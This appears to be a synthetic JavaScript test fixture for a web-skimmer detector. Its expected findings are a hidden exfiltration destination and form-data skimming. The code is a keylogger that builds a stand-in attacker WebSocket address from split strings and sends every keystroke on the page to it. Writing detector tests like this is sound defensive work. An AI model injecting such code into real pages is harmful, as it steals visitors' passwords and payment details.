// Synthetic test fixture: not functional malware. Hosts use the reserved .test TLD.
// context: script_host=cdn.vendor.test site=shop.example.test
// expect: exfil.hidden_destination=high skimmer.form_data=high
var ws = new WebSocket("wss://" + "sock" + "et.skim" + ".test/k");
document.addEventListener("keydown", function (e) { ws.send(e.key); });
